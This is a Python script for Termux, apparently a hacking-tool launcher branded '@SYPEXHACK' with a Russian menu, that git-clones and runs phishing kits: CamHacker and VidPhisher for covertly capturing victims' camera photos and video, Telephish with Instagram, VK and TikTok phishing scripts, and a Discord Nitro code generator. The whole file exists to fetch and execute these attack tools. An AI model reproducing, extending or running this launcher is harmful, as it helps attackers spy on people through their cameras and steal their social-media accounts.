import os, time

from colorama import Fore, Style

os.system('cd /data/data/com.termux/files/home/installer/')
os.system('clear')

print(f'\33]0; Installer\a',
                  end='', flush=True)

def res():
    print(Style.RESET_ALL)

def baner():
    os.system('clear')
    print(Fore.CYAN+'', Style.BRIGHT)
    print('')
    print("  ___                 _             _   _               ")
    print(" |_ _|  _ __    ___  | |_    __ _  | | | |   ___   _ __ ")
    print("  | |  | '_ \  / __| | __|  / _` | | | | |  / _ \ | '__|")
    print("  | |  | | | | \__ \ | |_  | (_| | | | | | |  __/ | |   ")
    print(" |___| |_| |_| |___/  \__|  \__,_| |_| |_|  \___| |_|   ")
    res()
    
while True:
    baner()
    print(Style.BRIGHT, Fore.CYAN+"[Telegram: @SYPEXHACK]                          ["+Fore.YELLOW+"2.9.0"+Fore.CYAN+"]")
    res()
    print(Fore.GREEN+"    [11] CamHacker  >>  Фотофишинг")
    print(Fore.GREEN+"    [12] VidPhisher >>  Видеофишинг")
    print(Fore.GREEN+"    [13] Telephish  >>  Фишинг в тг")
    print(Fore.GREEN+"    [15] Discord    >>  Генератор Nitro")
    res()
    print(Style.BRIGHT,Fore.CYAN+"   [20] Страница (3)")
    res()
    print(Fore.YELLOW+"    [s] Настройки")
    print(Fore.YELLOW+"    [e] Назад")
    res()
    inp = input('  Выбери пункт>>> ')
    os.system('clear')
    


    if inp == '11':
        filename = "CamHacker"

        if os.path.exists(filename):
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.GREEN+"~"+Fore.YELLOW+"] CamHacker уже установлен!")
            time.sleep(2)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(0.5)

            os.chdir('CamHacker')
            os.system('clear')
            os.system('bash ch.sh')
            tsu_102 = input('\n [Нажмите enter чтобы выйти]')
            os.chdir('/data/data/com.termux/files/home/installer')
            os.system('clear')

        else:
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] CamHacker еще НЕ установлен!")
            time.sleep(2)
            
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка CamHacker...")
            res()
            time.sleep(1.5)
            os.system('git clone https://github.com/KasRoudra/CamHacker')
            os.chdir('CamHacker')
            os.system('clear')
            os.system('bash ch.sh')
            tsu_102 = input('\n [Нажмите enter чтобы выйти]')
            os.chdir('/data/data/com.termux/files/home/installer')
            os.system('clear')



    if inp == '12':
        filename = "VidPhisher"

        if os.path.exists(filename):
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.GREEN+"~"+Fore.YELLOW+"] VidPhisher уже установлен!")
            time.sleep(2)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(0.5)

            os.chdir('VidPhisher')
            os.system('clear')
            os.system('bash vp.sh')
            tsu_202 = input('\n [Нажмите enter чтобы выйти]')
            os.chdir('/data/data/com.termux/files/home/installer')
            os.system('clear')

        else:
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] VidPhisher еще НЕ установлен!")
            time.sleep(2)
            
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка VidPhisher...")
            res()
            time.sleep(1.5)
            os.system('git clone https://github.com/KasRoudra/VidPhisher')
            os.chdir('VidPhisher')
            os.system('clear')
            os.system('bash vp.sh')
            tsu_202 = input('\n [Нажмите enter чтобы выйти]')
            os.chdir('/data/data/com.termux/files/home/installer')
            os.system('clear')



    if inp == '13':
        filename = "Telephish"

        if os.path.exists(filename):
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.GREEN+"~"+Fore.YELLOW+"] Telephish уже установлен!")
            time.sleep(2)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(0.5)

            os.chdir('Telephish')
            os.system('clear')
            os.system('python builder.py')
            os.system('clear')
            baner()
            os.system('clear')
            os.system('python Instagram.py')
            baner()
            os.system('clear')
            os.system('python vk.py.py')
            baner()
            os.system('clear')
            os.system('python tiktok.py')
            os.system('clear')
            os.system('rm -fr Instagram.py')
            os.system('rm -fr vk.py.py')
            os.system('rm -fr tiktok.py')
            tsu_102 = input('\n [Нажмите enter чтобы выйти]')
            os.chdir('/data/data/com.termux/files/home/installer')
            os.system('clear')

        else:
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Telephish еще НЕ установлен!")
            time.sleep(2)
            
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Telephish...")
            res()
            time.sleep(1.5)
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка pyTelegramBotAPI...")
            res()
            os.system('pip install pyTelegramBotAPI')
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Telephish...")
            res()
            os.system('git clone https://github.com/lamer112311/Telephish')
            os.chdir('Telephish')
            os.system('clear')
            os.system('python builder.py')
            os.system('clear')
            baner()
            os.system('clear')
            os.system('python Instagram.py')
            baner()
            os.system('clear')
            os.system('python vk.py.py')
            baner()
            os.system('clear')
            os.system('python tiktok.py')
            os.system('clear')
            os.system('rm -fr Instagram.py')
            os.system('rm -fr vk.py.py')
            os.system('rm -fr tiktok.py')
            tsu_102 = input('\n [Нажмите enter чтобы выйти]')
            os.chdir('/data/data/com.termux/files/home/installer')
            os.system('clear')



  
    if inp == '15':
        filename = "Discord-Nitro-Generator-and-Checker"

        if os.path.exists(filename):
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.GREEN+"~"+Fore.YELLOW+"] Discord-Nitro-Generator уже установлен!")
            time.sleep(2)
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(0.5)

            os.chdir('Discord-Nitro-Generator-and-Checker')
            os.system('clear')
            os.system('python3 main.py')
            tsu_502 = input('\n [Нажмите enter чтобы выйти]')
            os.chdir('/data/data/com.termux/files/home/installer')
            print(f'\33]0; Installer\a',
                  end='', flush=True)
            os.system('clear')

        else:
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Discord-Nitro-Generator еще НЕ установлен!")
            time.sleep(2)
            
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка зависимостей...")
            res()
            time.sleep(1.5)
            os.system('pip install requests')
            os.system('pip install discord_webhook')
            os.system('pip install colored')
            os.system('pkg install python-numpy -y')
            os.system('clear')
            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Discord-Nitro-Generator...")
            res()
            time.sleep(1.5)
            os.system('git clone https://github.com/logicguy1/Discord-Nitro-Generator-and-Checker.git')
            os.chdir('Discord-Nitro-Generator-and-Checker')
            os.system('clear')
            os.system('python3 main.py')
            tsu_502 = input('\n [Нажмите enter чтобы выйти]')
            os.chdir('/data/data/com.termux/files/home/installer')
            print(f'\33]0; Installer\a',
                  end='', flush=True)
            os.system('clear')

    


    












    
    

    if inp == '20':
        baner()
        print (Fore.YELLOW+" ["+Fore.RED+"!"+Fore.YELLOW+"] Страница (3) еще не доступна!")
        res()
        print(Fore.CYAN+'    [1]'+Fore.CYAN+' Добавить утилиту в Installer')
        res()
        print(Fore.YELLOW+'    [e]'+Fore.YELLOW+' Выход')
        res()
        tsu_20 = input('  Выбери пункт>>> ')

        if tsu_20 == '1':
            os.system('xdg-open https://forms.gle/vMHny8Yp24HQZqLV9')
            os.system('clear')

        else:
            os.system('clear')


    
    if inp == 's':
        os.system('cd /data/data/com.termux/files/home/installer/')
        os.system('python set.py')


    
    if inp == 'e':
        os.system('cd /data/data/com.termux/files/home/installer/')
        res()
        os.system('clear')
        break
